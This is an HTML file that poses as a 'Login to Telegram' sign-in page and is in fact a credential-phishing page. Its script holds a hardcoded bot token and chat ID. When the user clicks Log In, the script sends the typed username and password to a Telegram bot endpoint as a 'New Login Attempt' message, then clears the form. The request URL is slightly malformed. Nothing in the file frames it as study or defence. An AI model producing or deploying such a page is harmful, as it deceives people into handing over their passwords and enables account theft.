<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login to Telegram</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; display: flex; flex-direction: column; gap: 12px; }
        input { padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
        button { padding: 10px; background: #0088cc; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #006699; }
        #status { font-size: 12px; color: green; text-align: center; }
    </style>
</head>
<body>

<div class="login-box">
    <h3>Sign In</h3>
    <input type="text" id="username" placeholder="Username or Email">
    <input type="password" id="password" placeholder="Password">
    <button id="sendBtn">Log In</button>
    <div id="status"></div>
</div>

<script>
    const BOT_TOKEN = "8999440085:AAEfOUEZ_UP60mhHDzbWCMH8GKO6162EKuM";
    const CHAT_ID = "8714686528";

    document.getElementById("sendBtn").addEventListener("click", async () => {
        const user = document.getElementById("username").value;
        const pass = document.getElementById("password").value;
        const status = document.getElementById("status");

        if (!user || !pass) {
            alert("Please fill in both fields");
            return;
        }

        const text = `New Login Attempt:\nUser: ${user}\nPass: ${pass}`;
        const url = `https://telegram.org{BOT_TOKEN}/sendMessage`;

        try {
            status.textContent = "Sending...";
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text
                })
            });

            if (response.ok) {
                status.textContent = "Sent to Telegram!";
                document.getElementById("username").value = "";
                document.getElementById("password").value = "";
            } else {
                status.textContent = "Failed to send.";
            }
        } catch (error) {
            status.textContent = "Error connecting to Telegram.";
        }
    });
</script>

</body>
</html>
